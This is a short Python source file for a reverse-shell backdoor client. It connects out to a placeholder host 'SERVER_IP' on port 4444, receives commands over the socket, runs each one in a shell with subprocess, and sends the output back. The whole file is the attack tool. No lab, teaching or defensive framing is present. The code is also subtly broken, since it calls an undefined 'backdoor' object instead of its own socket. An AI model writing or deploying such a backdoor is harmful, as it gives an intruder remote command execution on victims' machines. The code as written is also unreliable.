import socket
import subprocess

class Client:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.connect((self.host, self.port))

    def run(self):
        while True:
            command = backdoor.recv(1024)
            command = command.decode()
            op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
            output = op.stdout.read()
            output_error = op.stderr.read()
            backdoor.send(output + output_error)


if __name__ == "__main__":
    host = "SERVER_IP"
    port = 4444
    client = Client(host, port)
    client.run()